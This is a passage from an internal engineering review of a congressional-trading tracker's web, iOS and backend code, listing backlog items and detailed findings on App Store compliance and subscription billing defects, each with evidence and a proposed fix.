- #68 [P2] sector-flow GROUP BY binds to raw sr.sector, so canonical sector labels still appear 2-3 times per response — new
- #73 [P2] /member/:id/performance does not resolve bioguide ids, so the same politician shows empty performance when opened by ?member=P000197 and populated via slug — new
- #76 [P2] Webhook payload omits politician name, chamber, party and filedDate (SSE replay has them) — still-open-since-2026-07-28 (X1 partially: signing doc exists, payload schema still undocumented)
- #77 [P2] No test/ping delivery for a new webhook or SSE target — still-open-since-2026-07-28 (X2)
- #104 [P2] Filter chip labels announced 2-4 times each (label applied to chip children) — new
- #105 [P2] Buys vs Sells chart conveys buy/sell only by green vs red — no legend, no per-segment numbers — still-open-since-2026-07-13 (clients/ios/IMPROVEMENT-PLAN.md § P2 'non-color status cues', line 97)
- #114 [P2] RSS is not autodiscoverable: no <link rel=alternate> in <head>, and it lives under robots-disallowed, noindex /api/ — still-open-since-2026-07-28 (docs/reviews/2026-07-28-full-app-review.md W9)
- #117 [P2] "feed" terminology still used in user-facing web copy (banner, loading, error, pricing feature, meta, push body) — still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P2-9 flagged the banner)
- #125 [P2] Desktop Trades search input is narrower than its own placeholder ('Search name, ticker, sta') — still-open-since-2026-08-18 (capture NOTES.md h.2)
- #144 [P2] Trends dashboard on phone is ~10-12k CSS px tall with every <details> section default-open (still open since 2026-08-10 review P1-7) — still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P1-7)
- #149 [P2] Pager advertises unreachable pages: "Page 1 of 1,798" at All Time while anonymous browsing stops at page 41 — still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P1-6)
- #159 [P2] No user-visible delivery health: failures, parks, quarantines and terminal errors are only emailed to the admin — still-open-since-2026-07-28 (W6 'no delivery-health visibility')
- #163 [P2] Premium is sold to developers but there are no public webhook/SSE docs or payload examples — new
- #164 [P2] Push-notification tap routing is dead twice over: AppDelegate reads `trade_id`/`doc_id` but the backend sends `txId`/`docId`, and nothing observes the posted notifications — still-open-since-2026-07-13 (IMPROVEMENT-PLAN P1.2)
- #167 [P2] Asset display names still unnormalized ("… CMN", "Rate/Coupon: … Matures: …", suspect HONAV ticker) — still-open-since-2026-08-06 (issue #1453; ux-findings §5 2026-08-10)
- #168 [P2] iOS Delivery creation still cannot set per-subscription tickers, sides or min amount (silently reuses the global watchlist) — still-open-since-2026-08-10 (ux-findings §8; 07-28 I9)
- #171 [P2] Trade cards are not grouped for VoiceOver: 6 elements per row, amount/date orphaned — still-open-since-2026-07-13 (clients/ios/IMPROVEMENT-PLAN.md § P2 'VoiceOver order/actions', line 97)
- #172 [P2] Directory Assets/People rows do not adapt to large Dynamic Type ('politi-cians', 'Microsoft Corpo…') — still-open-since-2026-07-13 (clients/ios/IMPROVEMENT-PLAN.md § P2 'Dynamic Type through accessibility sizes', line 97)
- #176 [P2] Snapshot/KPI tiles differ between web and iOS in metric set, labels, formatting and tile design — new
- #177 [P2] Nested interactive controls: rows/cards with role=button contain child role=button targets (double tab stops, invalid ARIA) — still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md §Accessibility)
- #189 [P2] 476 KB of inline browser JavaScript is never executed by any test, linted, or type-checked; UI coverage numbers are an artifact — still-open-since-2026-07-28 (C1 no e2e); coverage-theater note tracked-in-PR-#1979
- #190 [P2] The two monoliths keep growing: dashboardHtml.ts 12,388 lines (155 commits/30 d, 4 open PRs) and admin/routes.ts 10,340 lines — still-open-since-2026-07-28 (C8), grown ~40% since
- #204 [P2] `onOpenURL` accepts a session token from any `congresstrade://auth?token=` source (login-CSRF) and the Google flow still transports the bearer in a URL; the magic-link reason for the cold-open handler is gone — still-open-since-2026-07-13 (IMPROVEMENT-PLAN P0.2)
- #213 [P3] No trial-end, renewal, or 'cancels on' date is shown anywhere (web or iOS); iOS Entitlement model still drops those fields — still-open-since-2026-07-28 (docs/reviews/2026-07-28-full-app-review.md I6)
- #222 [P3] Three different event names for one delivery (transaction.created / trade.new / congress.trade) and OpenAPI documents the wrong SSE event — still-open-since-2026-07-28 (X4 spec drift)
- #226 [P3] Core docs and package scripts still describe the retired Cloudflare Workers/D1/wrangler stack — still-open-since-2026-07-28 (C4, C9)
- #227 [P3] ~66 tracked scratch scripts at repo root plus more under app/ and app/scripts — still-open-since-2026-07-28 (C6)
- #228 [P3] Dead/orphaned code paths: magic-link auth routes live behind a removed UI, unreachable modules, migration numbering anomalies — C5/C7 still-open-since-2026-07-28; magic-link leftover new
- #248 [P3] Company section fallback still shows operator language ('once a market-data API key is configured') — still-open-since-2026-08-10 (P2-3)
- #249 [P3] Drawer sticky title still aria-hidden even when populated — still-open-since-2026-08-10 (P2-7)
- #250 [P3] OpenRouter extraction requests still send no `temperature` (provider default 1.0) and agreement-trio reads run sequentially — still-open-since-2026-07-28 (P1-4, P1-5)
- #251 [P3] House reconciler still written but never scheduled — still-open-since-2026-07-28 (O5)
- #253 [P3] Fixed-point font sizes do not scale with Dynamic Type (chip glyphs 9pt, Google button 16pt, theme icons 13pt) — new
- #275 [P3] Money-suffix casing still mixed: "$250k-$1M", "Over $1M", "$50M+" vs lowercase k/m/b elsewhere — still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P2-1)
- #276 [P3] Delivery select shows lowercase "webhook" beside "SSE", and pricing badge shouts "SAVE ~17%" — still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P2-2)
- #283 [P3] Ticker drawer Activity block: five tiles in a two-column grid leaves 'Buy Pressure' orphaned; header/hero company casing disagree — still-open-since-2026-08-18 (capture NOTES.md h.8)
- #295 [P3] No skip link; keyboard users tab through brand/tabs/account/filters before content — still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P2-5)
- #307 [P3] Filter chips are icon + "All" with no visible category label; the side chip has no text at all when unset — new
- #309 [P3] Directory first paint is a text "Loading directory…" row with no skeleton (still open from 2026-08-10) — still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P1-5)
- #317 [P3] Single monolithic `ObservableObject` store (and TabRouter/PushNotificationManager) violates the repo's own '@Observable, never ObservableObject' rule and invalidates every tab on every @Published write — still-open-since-2026-07-13 (IMPROVEMENT-PLAN P1)
- #320 [P3] Committee data missing for prominent members ('Committees: Not recorded' for Pelosi) — 9 of top-40 filers empty — still-open-since-2026-08-06 (#1460 OPEN, #1458)
- #321 [P3] iOS Trends fetches Party Split but never renders it; Sector Breakdown (asset-type) and Buy Pressure tile still missing — still-open-since-2026-07-28 (I7; ux-findings §8)
- #322 [P3] iOS ticker sheet still thin vs web asset drawer (no Buy Pressure, buys/sells chart, backtest, Top Buyers/Sellers) — still-open-since-2026-07-28 (I5; ux-findings §8)
- #326 [P3] No App Store smart banner, no apple-app-site-association, no Associated Domains — iOS share links open Safari, not the app — still-open-since-2026-07-28 (docs/reviews/2026-07-28-full-app-review.md I10; issue #1048 OPEN; also leftover F1 in open PR #1973 parity audit)
- #335 [P3] Mobile web hides Sign In / Upgrade inside the hamburger — no visible CTA in the chrome — still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P1-3 'Sign In / Upgrade not one control group'; desktop fixed, mobile buried)
- #353 [P3] Public API default ordering surfaces 2020 seed_dataset ('seed-senate') rows first — still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P0-4)
- #374 [P3] No documented restore / host-loss runbook; recovery from losing the single Hetzner box + single SQLite file is untested procedure — still-open-since-2026-07-28 (docs/reviews/2026-07-28-full-app-review.md O2 — backup half now done, restore runbook still missing)
- #375 [P3] minimumScaleFactor and fixed widths shrink/clip values at large text sizes — still-open-since-2026-07-13 (clients/ios/IMPROVEMENT-PLAN.md § P2, line 97)
- #398 [P4] iOS Trades parity: 3 sort keys vs web 12, page sizes 50/100/200, no $ min/max filter — still-open-since-2026-08-10 (ux-findings §8)
- #420 [P4] Web form cannot set (and Edit silently erases) sectors, market-cap buckets and maxAmount that the engine supports — still-open-since-2026-07-28 (W6, partially fixed)
- #425 [P4] Localization readiness: no strings catalog, hard-coded plurals, non-locale date patterns, hand-rolled currency — still-open-since-2026-07-13 (clients/ios/IMPROVEMENT-PLAN.md § P2 'localized strings and locale-safe date/number/currency formatting', line 99)
- #462 [P4] No iOS platform surfaces: Home Screen widget, Spotlight/App Intents, Share extension — still-open-since-2026-08-06 (docs/reviews/2026-08-06-full-product-review.md iOS backlog #1048)

## All findings by theme

### App Store review blockers and Apple platform compliance (9)

The iOS binary in review still steers users to a web Stripe checkout, has no in-app account deletion, and ships review notes that describe a build and a sign-in method that no longer exist.  These are the items that decide whether the app ships at all.

#### 2. [P0] iOS 'Filing PDF' button routes non-Premium users to the web Stripe paywall (3.1.1 steering path survives #1984)

- **Where:** clients/ios/CongressTrade/Views/Feed/TradeDetailView.swift:241-259; app/src/delivery/rest.ts:1410-1414  ·  **Surface:** iOS  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Tapping the Premium-gated 'Filing PDF' button as a free/anonymous iOS user opens Safari on congress.trade's Stripe checkout modal for the same digital good sold via IAP.  That is exactly the in-app call-to-action to an external purchase that Guideline 3.1.1 prohibits outside the US storefront, and it contradicts the review notes' own claim that iOS does not take web payments.
- **Impact:** App Review rejection risk (3.1.1) after the app has already been bounced once on 2.1; contradicts the sworn review notes; poor UX for free users dumped into Safari with no explanation.
- **Fix:** Gate the button in-app: when `!store.isPremium` show it disabled with a caption or open `PremiumSheet` (StoreKit) instead of `openURL`; have the backend return 402 JSON (not a 302 to /pricing) when the request carries a Bearer token or `Accept: application/pdf`; add a case to iosNoWebCheckout.test.ts asserting no `documentPDFURL` path opens Safari for non-premium.
- **Evidence:** Verified on origin/main: TradeDetailView.swift:241 `private var filingButtons` builds `pdfURL` via `store.api.documentPDFURL(docId:)` (line 244) with no `store.isPremium` / `store.signedIn` check anywhere in the view, and line 257 calls `openURL(pdfURL)` directly. app/src/delivery/rest.ts:1410-1413 `serveDocumentPdf`: `const user = await getCurrentUserFromRequest(c); if (!user || !(await isPremiumUserAsync(c.env, user))) { return c.redirect('/pricing?feature=pdf', 302); }`. Live reproduced: `curl -I .../api/documents/H-2024-20025243/pdf` -> `302 location: /pricing?feature=pdf`, and `/pricing` -> `302 location: /?pricing=1&view=subs`. Screenshot ios/light/14-trade-detail-scrolled.png (opened) shows the 'Filing PDF' / 'Source Filing' buttons rendered for an anonymous user with no lock/paywall affordance. `iosNoWebCheckout.test.ts` (origin/main) has 3 `it()` blocks, none referencing `documentPDFURL` or the Filing PDF path.
- **Panel:** app-store-compliance — Reproduced directly: code path, live 302 chain, and screenshot all agree.  Tightened path:line to the actual origin/main locations (241-259, not 253-259). · merged: ios-hig-ux/IOSHIGUX-03 · `app-store-compliance/APPSTORECOMPLIANCE-01`

#### 13. [P1] Binary in App Review (1.0.15 / 202608150702) predates the 3.1.1 fixes the review notes describe

- **Where:** docs/rollouts/2026-08-17-ios-no-web-checkout.md; docs/rollouts/2026-08-16-asc-21-reply.md  ·  **Surface:** iOS  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)  ·  **Quick win**  ·  **Status:** tracked-in-PR-#1979 (BS-P4 'do not submit a binary that predates the fixes') -- 3.1.1-specific mismatch is new
- **What:** The notes Apple reads promise IAP-only purchasing with no web-checkout links, but the attached 1.0.15 binary was built before #1984 removed those Safari links from Delivery/PremiumSheet/footer.  A reviewer following the notes will see a different app than the one described.
- **Impact:** Likely 3.1.1 and/or 2.1 rejection; each round costs days.
- **Fix:** Cut a new GM build from origin/main (post-#1984, and post-#2010 for the Email Link removal), attach it to 1.0.0, re-read the notes against the actual binary, then resubmit.
- **Evidence:** docs/rollouts/2026-08-16-asc-21-reply.md (verified verbatim): 'The binary on this submission is still 202608150702 (1.0.15). Footer buttons + later sort layout are on main (#1890) and ship as a later TestFlight.' `git show -s --format='%ci' 8f91ee0f` = 2026-08-18 00:07:38 -- i.e. #1984 (the web-checkout removal) landed AFTER that 2026-08-16 submission. `gh run list --workflow=ios-appstore-gm.yml` confirms the last successful GM ship run was 2026-08-16T21:07:28Z, also before 8f91ee0f. `gh run list --workflow=ios-ship.yml` (TestFlight) shows scheduled runs completing in 8-9s each (no-op, matching the claim). review-notes-1.0.txt line ~28 states 'Delivery and the empty StoreKit catalog do not link to website checkout' -- true only after #1984, which the attached binary predates.
- **Panel:** app-store-compliance — Timestamps and workflow-run history independently confirm the ordering claimed. · `app-store-compliance/APPSTORECOMPLIANCE-04`

#### 14. [P1] Premium iOS subscribers cannot open the filing PDF at all -- openURL sends Safari without the Bearer session

- **Where:** clients/ios/CongressTrade/APIClient.swift:160-164; clients/ios/CongressTrade/Views/Feed/TradeDetailView.swift:257; app/src/auth/session.ts:160-193  ·  **Surface:** iOS  ·  **Category:** billing  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The first Premium benefit listed on the paywall is not deliverable from the app: every iOS user, including those who paid $5/$50 through IAP, is redirected to the web pricing page when they tap Filing PDF, because the session lives in Keychain as a Bearer token and Safari never presents it.
- **Impact:** Money-path defect: paid feature advertised on the IAP paywall does not work in-app; App Review may test it after a sandbox purchase and reject for 2.1 / 3.1.2 (promised content not delivered).
- **Fix:** Fetch the PDF through `APIClient` with the Bearer header and present it in-app (QuickLook/PDFKit or a temp file share sheet), or mint a short-lived signed download URL via a client command and open that; add an XCTest that Premium state never calls openURL with an origin PDF URL.
- **Evidence:** origin/main APIClient.swift:160-163 `documentPDFURL` returns a bare `/api/documents/<id>/pdf` URL with no auth token attached; TradeDetailView.swift:257 opens it with SwiftUI `openURL` (external Safari -- no Authorization header, no cookie). No SFSafariViewController/WKWebView/PDFKit usage found anywhere in clients/ios. app/src/auth/session.ts:161-167 `bearerSessionToken` reads only the `Authorization` header; :191-193 `getCurrentUserFromRequest` falls back to the cookie -- Safari, launched externally from an iOS-only Keychain session, has neither. rest.ts:1412-1413 therefore redirects even paying users to /pricing. PremiumSheet.swift's benefit list (line ~48) sells this as benefit #1: 'Open the original filing PDF from Congress' -- confirmed verbatim in screenshot ios/light/29-premium-sheet.png.
- **Panel:** app-store-compliance — Reproduced: no query-param token, no in-app browser anywhere in the codebase, and session.ts confirms bearer-only auth for native clients with no cookie fallback available to an externally-launched Safari. · merged: billing/BILLING-01, ios-engineering/IOSENGINEERING-01, ios-shipped-app/IOSSHIPPEDAPP-02 · `app-store-compliance/APPSTORECOMPLIANCE-02`

#### 155. [P2] Sign-out never unregisters the APNs device; token sync is per-device not per-user, so alerts keep going to the previous account

- **Where:** clients/ios/CongressTrade/Store/CongressTradeStore.swift:1344-1370  ·  **Surface:** iOS  ·  **Category:** security  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** After sign-out the device remains an active push target for the old account, and a second account signing in on the same phone is silently never registered (the client believes the token is already synced because the UserDefaults flags survive logout).  Personal alert routing follows the device, not the user.
- **Impact:** Privacy leak on shared/second-hand devices; broken alerts for the new user; an Apple privacy-label mismatch ('linked to you' data retained after logout).
- **Fix:** Add an `unregisterDevice()` method to APIClient.swift that POSTs the `unregister_device` command (which the backend already supports); call it (fire-and-forget) from signOut() and reset `apns_last_synced_token`/`isBackendSynced`; key the client sync state by user id so a second sign-in re-registers.
- **Evidence:** origin/main CongressTradeStore.swift `signOut()` calls only `try await api.logout()` and `try api.tokenStore.clear()` -- no device-unregister call anywhere in the function body. PushNotificationManager.swift keys sync state off `apns_last_synced_token`/`isBackendSynced` in UserDefaults, neither of which is cleared by signOut (grep for those keys outside PushNotificationManager.swift finds no writer in CongressTradeStore.swift). pushDevices.ts `upsertPushDevice` keys rows by (user_id, platform, token), so the old user's device row stays `active=1` after sign-out. CORRECTION to the raw finding's evidence: `git grep -in unregister origin/main -- clients/ios` returns ZERO results -- there is in fact no `unregisterDevice` method anywhere in APIClient.swift or the test target (the raw finding incorrectly claimed one exists with 'no caller outside tests'). The backend command type `unregister_device` does exist (commands.ts:261) and is reachable, but nothing in the iOS client ever constructs that request.
- **Panel:** app-store-compliance — Core defect (device survives sign-out) is confirmed.  The evidence had a factual error -- claimed an unused `unregisterDevice` Swift method exists; it does not exist at all, so the fix is larger than 'wire an existing call' (bumped effort S->M, rewrote evidence/recommendation accordingly). · merged: delivery-alerts/DELIVERYALERTS-16, ios-engineering/IOSENGINEERING-06 · `app-store-compliance/APPSTORECOMPLIANCE-08`

#### 210. [P3] App Review notes still describe 'Email Link' / magic-link sign-in removed by #2010

- **Where:** docs/app-store/review-notes-1.0.txt:19,22,28  ·  **Surface:** iOS  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The next binary will not have the Email Link control the notes tell the reviewer to use.
- **Impact:** 2.1 'information needed' round-trip if the reviewer looks for a described feature.
- **Fix:** Update items 4 and 5 of the notes and the ASC field in the same PR that ships the next build.
- **Evidence:** review-notes-1.0.txt line ~19 (verified verbatim): 'use Sign in with Apple (recommended for review), Sign in with Google, or Email Link.' Line ~28: 'transactional email for magic links'. `git log origin/main --oneline --grep="Email Link" -i` -> a573bce0 '[CURSOR] Remove broken email magic-link sign-in (#2010)', with follow-ups 9361c824 and 62c6fe1f closing it out. `grep -n magic|Email` on origin/main Components.swift returns nothing.
- **Panel:** app-store-compliance — Fully reproduced via git log and file content. · `app-store-compliance/APPSTORECOMPLIANCE-12`

#### 211. [P3] UIBackgroundModes remote-notification declared but no silent-push handler exists

- **Where:** clients/ios/CongressTrade/Info.plist:58-61; clients/ios/CongressTrade/AppDelegate.swift  ·  **Surface:** iOS  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The background mode is unused; Guideline 2.5.4 requires background modes to be used for their intended purpose.
- **Impact:** Minor review question; misleading capability declaration.
- **Fix:** Remove the background mode (alert pushes do not need it) or implement a real background fetch handler.
- **Evidence:** Info.plist:58-61 `UIBackgroundModes` = [remote-notification], confirmed verbatim. AppDelegate.swift (full 64-line file read) implements only `didFinishLaunchingWithOptions`, `didRegisterForRemoteNotificationsWithDeviceToken`, `didFailToRegisterForRemoteNotificationsWithError`, `willPresent`, and `didReceive(response:)` -- no `application(_:didReceiveRemoteNotification:fetchCompletionHandler:)`. apns.ts `buildApnsPayload` builds `{ aps: { alert, sound, 'interruption-level' }, ...data }` -- never sets `content-available`, confirmed by reading the full function.
- **Panel:** app-store-compliance — Fully reproduced. · `app-store-compliance/APPSTORECOMPLIANCE-13`

#### 212. [P3] Sign in with Apple credential revocation is never checked

- **Where:** clients/ios/CongressTrade/Store/CongressTradeStore.swift (session bootstrap)  ·  **Surface:** iOS  ·  **Category:** security  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** When a user revokes the app in Settings > Apple ID > Sign in with Apple, the backend session stays valid indefinitely; Apple's SIWA guidance expects apps to check `ASAuthorizationAppleIDProvider.getCredentialState` and sign out on `.revoked`.
- **Impact:** Session outlives the user's revocation; part of the 5.1.1(v)/SIWA hygiene set reviewers check.
- **Fix:** On launch and on `credentialRevokedNotification`, call getCredentialState for stored apple users and sign out on .revoked/.notFound; register an Apple server-to-server notification URL to invalidate sessions on consent revocation.
- **Evidence:** `git grep -in getCredentialState|credentialRevokedNotification origin/main -- clients/ios` returns zero matches. `git grep -in revoke origin/main -- app/src/auth` returns only session-cookie revocation (session.ts comments, routes.test.ts) -- no Apple server-to-server notification endpoint for consent-revoked/account-delete.
- **Panel:** app-store-compliance — Negative-evidence claim (absence of code) reproduced via grep with zero hits, both client and server side. · `app-store-compliance/APPSTORECOMPLIANCE-16`

#### 333. [P3] 'Subscribe with Apple' buttons use the Apple logo glyph outside an Apple-provided control

- **Where:** clients/ios/CongressTrade/Views/Delivery/DeliveryView.swift:51,82; clients/ios/CongressTrade/Views/Feed/FeedDashboardView.swift:1244  ·  **Surface:** iOS  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Apple's trademark guidelines allow the Apple logo in apps only through Apple-supplied controls (Sign in with Apple, Apple Pay); a custom 'Subscribe with Apple' button with the apple.logo glyph is a common reviewer nit (2.3 / 5.2.5 branding).
- **Impact:** Possible metadata/branding rejection note; trivial to avoid.
- **Fix:** Rename to 'Subscribe' / 'Go Premium' with a sparkles or creditcard symbol; keep 'App Store' wording only where it refers to Apple's own service (e.g. 'Manage on App Store').
- **Evidence:** origin/main DeliveryView.swift Premium section: `Label("Subscribe with Apple", systemImage: "apple.logo")` appears twice (the compact 'Premium' section button and the Premium-Feature upsell button). FeedDashboardView.swift:1244 same: `Label("Subscribe with Apple", systemImage: "apple.logo")` in the Export CSV sheet.
- **Panel:** app-store-compliance — All three usages reproduced exactly (grep -n "apple.logo"). · `app-store-compliance/APPSTORECOMPLIANCE-18`

#### 464. [P4] Verify ASC age rating and App Privacy label against the 18+ ToS and actual collection (owner-only fields not in repo)

- **Where:** App Store Connect -> App Information / App Privacy; app/src/ui/legalHtml.ts:194 & :300  ·  **Surface:** iOS  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (low confidence)
- **What:** The app's own terms restrict it to adults while the store listing's age rating and privacy label are unrecorded in the repo, so nothing lets an agent confirm consistency before the next submit.
- **Impact:** Low; potential 2.3 metadata inconsistency if the rating is set below what the ToS implies.
- **Fix:** Record the ASC age rating + privacy label answers in docs/app-store/ and reconcile with ToS §2 (either an 18+ rating or soften the ToS age clause to 'of legal age to contract').
- **Evidence:** legalHtml.ts:194 'You must be at least 18 years old and able to form a binding contract'; :300 'The Service is not directed to, and may not be used by, anyone under 18.' docs/rollouts/2026-08-09-ios-testflight-shipped.md (verified verbatim): 'App Privacy nutrition labels' listed under 'Owner-only remaining (browser)'. No repo artifact records the chosen ASC age rating or privacy-label answers.
- **Panel:** app-store-compliance — ToS clauses and the owner-only-remaining doc line both reproduced; the ASC-side half is inherently unverifiable from the repo, which the raw finding itself already flagged with low confidence -- appropriate as-is. · `app-store-compliance/APPSTORECOMPLIANCE-19`

### Money path: subscriptions, entitlements and refunds (19)

Apple's server notifications never reach production, refunds and sandbox purchases are mishandled, and nothing in either client tells a customer what they are paying, when it renews, or how to cancel.  Every defect here is either lost revenue or a chargeback.

#### 5. [P0] Apple App Store Server Notifications route (/api/webhooks/apple) is only mounted in the dead src/app.ts, not in the production entry index.ts

- **Where:** app/src/app.ts:30; app/src/index.ts mountApiRouters (~lines 120-178); app/src/deno/main.ts:6  ·  **Surface:** Backend  ·  **Category:** billing  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** new (root cause C5 dead router still-open-since-2026-07-28)
- **What:** PR #1553 added the Apple webhook to app.ts, a duplicate router assembly that the 2026-07-28 review (C5) had already flagged as dead.  Production therefore 404s Apple's server notifications; refunds/revocations are not applied until the stored expiry, and renewals only propagate when the iOS app happens to run Transaction.updates.  Two divergent router assemblies guarantee this class of bug recurs.
- **Impact:** Money-path correctness (Apple-side revocations ignored; web Premium features like webhook/SSE stay entitled after a refund) and Apple will see a failing notification endpoint.
- **Fix:** Delete app.ts; mount buildAppleWebhookRouter() in index.ts mountApiRouters before the UI catch-all; add a route-inventory test that asserts every documented public path in client-mobile-api.md / openapi.yaml resolves on the production Hono app (not 404).
- **Evidence:** deno/main.ts:6 `import app from '../index.ts';` index.ts's mountApiRouters() (lines 120-176) mounts /api, /api/admin, /api/analytics, /api/client/v1, /api/export, /api/ingest, /auth, /billing, / — and NOT /api/webhooks; index.ts's import list (grepped `^import`) does not include billing/appleWebhook.ts at all. app.ts:30 `try { app.route('/api/webhooks', buildAppleWebhookRouter()); }` but `deno info src/deno/main.ts` shows zero occurrences of app.ts, billing/appleWebhook.ts anywhere in the reachable dependency graph from the real entrypoint. app/docs/client-mobile-api.md:135 'App Store Server Notifications V2 land at POST /api/webhooks/apple'; security/botDefense.ts:65 EXEMPT_PREFIXES includes '/api/webhooks' (dead exemption for an unmounted route). GET /api/admin/config-sources shows APPLE_IAP_ENABLED source=infisical (feature configured) confirmed present in admin/routes.ts REGISTRY at line 3445. appleSubscriptions.ts:113-119 `activeAppleSubscriptionForUser` grants entitlement purely from `status IN ('active','grace_period') AND expires_date > now`; appleWebhook.ts has REVOKE (line 209), DID_FAIL_TO_RENEW (224), GRACE_PERIOD_EXPIRED (247) handlers that update that status column but they never execute because the route carrying them is unreachable.
- **Panel:** engineering-quality — Fully reproduced.  Read app/src/index.ts in full: the top-level import list (18 statements) has no reference to billing/appleWebhook.ts, and mountApiRouters() (lines 120-176) mounts exactly the 7 routers the finding lists plus '/', never '/api/webhooks'.  Ran `deno info src/deno/main.ts` and grepped the full dependency tree for app.ts/appleWebhook/batchCron/houseReconciler -- zero hits, confirming these are genuinely unreachable from the production entrypoint.  Read appleWebhook.ts and confirmed the REVOKE/DID_FAIL_TO_RENEW/GRACE_PERIOD_EXPIRED handlers exist at the cited lines.  Read appleSubscriptions.ts:104-119 and confirmed entitlement is purely expiry-date-driven with no path for a webhook-driven status update to ever land, since the router carrying that update is dead code.  This is a real, currently-live production defect. · merged: prior-review-followup/PRIORREVIEWFOLLOWUP-31 · `engineering-quality/ENGINEERINGQUALITY-02`

#### 6. [P0] Apple REFUND not applied, Sandbox JWS accepted in production, Stripe webhook ignores livemode/refund/dispute (tracked in PR #1981)

- **Where:** POST /api/webhooks/apple, redeem_apple_purchase, POST /billing/webhook  ·  **Surface:** Backend  ·  **Category:** billing  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** tracked-in-PR-#1981
- **What:** A refunded Apple subscription keeps Premium until expiresDate (annual: up to 12 months of free access); a sandbox/TestFlight-signed transaction grants live Premium; a Stripe refund/dispute that leaves the subscription active keeps access.  Already documented in the purchases audit — listed here so the panel knows it is on the board, not re-discovered.
- **Impact:** Revenue leakage and abuse vector.
- **Fix:** Land PR #1981 follow-ups B and C: apply REFUND like REVOKE, reject `environment === 'Sandbox'` unless an explicit allow flag, require `event.livemode` to match the key prefix, and decide/implement the Stripe refund rule.
- **Evidence:** app/src/billing/appleWebhook.ts:57-64 HANDLED_NOTIFICATION_TYPES = {DID_RENEW, EXPIRED, DID_CHANGE_RENEWAL_STATUS, REVOKE, DID_FAIL_TO_RENEW, GRACE_PERIOD_EXPIRED} excludes REFUND; :107-110 comment 'Unhandled types (SUBSCRIBED, REFUND, PRICE_INCREASE, ...) are acknowledged but not applied yet.' client/commands.ts:330 stores `environment: transaction.environment ?? null` without rejecting 'Sandbox'. billing/routes.ts:275-337 never reads `event.livemode`; switch handles only checkout.session.completed + customer.subscription.created/updated/deleted, `default: break`. PR #1981 (still OPEN, docs-only) §4 'Refund / dispute Fail', §5 'Sandbox vs Production Fail'.
- **Panel:** billing — Code quoted verbatim. `gh pr view 1981` confirms state OPEN, report-only ('No product code'), so this remains an open gap on main, not already fixed. · `billing/BILLING-03`

#### 19. [P1] No duplicate-subscription guard: a Premium user can start a second Stripe checkout from /pricing (and an Apple subscriber can buy Stripe too)

- **Where:** Pricing modal (web) + POST /billing/checkout  ·  **Surface:** Cross-surface  ·  **Category:** billing  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Only the header 'Upgrade' button is hidden for Premium users (confirmed at dashboardHtml.ts:11271-11274, `ent.premium || !checkoutConfigured() ? '' : '<button ...  Upgrade</button>'`); the modal remains reachable via /pricing, ?pricing=1, the footer link, the iOS footer link and the PDF redirect.  Clicking 'Start Free Trial' creates a second subscription (double billing after the trial).  The same route also lets a user whose Premium comes from Apple IAP buy a Stripe plan on the web.
- **Impact:** Double charges, chargebacks, support load; money-path defect.
- **Fix:** Server: in /billing/checkout return 409 `already_subscribed` when `resolveEntitlementAsync(...).premium` (or when a Stripe subscription in trialing/active/past_due exists); client: when `ME.entitlement.premium`, render the modal as 'You have Premium (source) — Manage subscription' instead of the plan grid.
- **Evidence:** app/src/ui/dashboardHtml.ts:12104-12106 `if (pricing === '1' || ...) { openPricing(...) }` opens the modal with no `isPremium()` check; `openPricing` (11421-11448) and `startCheckout` (11461-11484) never test `ME.entitlement.premium`. ui/routes.ts:221 `/pricing` → `/?pricing=1&view=subs`; footer link dashboardHtml.ts:3234 `<a href="/pricing">Pricing</a>` and the iOS paywall footer 'Pricing' link (Components.swift:1371) both land there. Server: billing/routes.ts:107-159 creates a Checkout Session whenever the user is signed in and checkout is configured — no check of `user.subscriptionStatus` or `activeAppleSubscriptionForUser`. stripe.ts:141-178 passes an existing `customer`, and Stripe Checkout happily creates a second subscription on the same customer.
- **Panel:** billing — openPricing/startCheckout read verbatim — no premium check anywhere in either function. billing/routes.ts POST /checkout (lines 107-159) confirmed to check only sign-in and checkout-configured, never prior subscription state. · `billing/BILLING-02`

#### 64. [P2] Web 'Manage Subscription' for Apple-sourced Premium users calls the Stripe portal and fails with a 400 toast

- **Where:** Account menu → Manage Subscription (signed-in, Premium via App Store)  ·  **Surface:** Web  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** An iOS subscriber who signs in on the web sees 'Premium' and a 'Manage Subscription' entry that errors with an internal-sounding message; there is no hint that the subscription is managed in iOS Settings / App Store.
- **Impact:** Cancellation/management path appears broken for Apple subscribers on web; support tickets; FTC click-to-cancel optics.
- **Fix:** Use `ME.entitlement.source`: when 'apple', render 'Manage on App Store' linking to https://apps.apple.com/account/subscriptions (and copy 'Managed through Apple'); only show the Stripe portal button when `ME.billing.hasCustomer`.
